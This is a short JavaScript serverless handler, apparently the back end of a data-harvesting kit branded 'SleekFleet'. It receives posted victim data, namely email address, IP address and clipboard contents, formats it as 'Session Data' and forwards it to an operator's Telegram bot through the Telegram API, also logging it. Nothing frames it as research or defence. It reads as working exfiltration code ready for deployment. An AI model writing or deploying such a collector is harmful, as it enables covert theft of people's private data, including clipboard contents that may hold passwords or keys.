// src/api/scrape.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  try {
    const payload = req.body;
    
    // 1. Format Message for Telegram
    const msg = `
🚗 *SleekFleet Session Data*

🆔 Email: \`${payload.email || "N/A"}\`
🌐 IP: \`${payload.ip || "Unknown"}\`
📋 Clipboard: \`${payload.data || "Empty"}\`
📍 Source: ${payload.source || 'web'}
⏰ Time: ${new Date().toISOString()}
    `.trim();

    // 2. Send to Telegram (if env vars exist)
    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;

    if (tgToken && tgChatId) {
      try {
        const tgUrl = `https://api.telegram.org/bot${tgToken}/sendMessage`;
        await fetch(tgUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: tgChatId, 
            text: msg, 
            parse_mode: 'Markdown' 
          })
        });
      } catch (err) {
        console.error("Telegram Error:", err.message);
      }
    }

    // 3. Log locally for debugging
    console.log("Data Received:", payload);

    res.status(200).json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}
